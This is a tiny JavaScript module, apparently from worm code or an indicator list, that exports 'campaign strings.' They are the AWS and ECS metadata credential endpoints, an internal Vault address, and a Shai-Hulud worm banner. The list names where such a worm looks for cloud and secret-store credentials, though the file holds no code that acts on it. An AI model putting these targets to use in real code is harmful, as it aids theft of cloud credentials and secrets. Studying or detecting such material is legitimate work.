// Shared campaign strings used for persistence and propagation.
const metadataUrl = "http://169.254.169.254/latest/meta-data/iam/security-credentials/";
const ecsMetadataUrl = "http://169.254.170.2";
const vaultUrl = "http://vault.svc.cluster.local:8200";
const wormBanner = "A Mini Shai-Hulud has Appeared";

export const runtimeTargets = [metadataUrl, ecsMetadataUrl, vaultUrl, wormBanner];
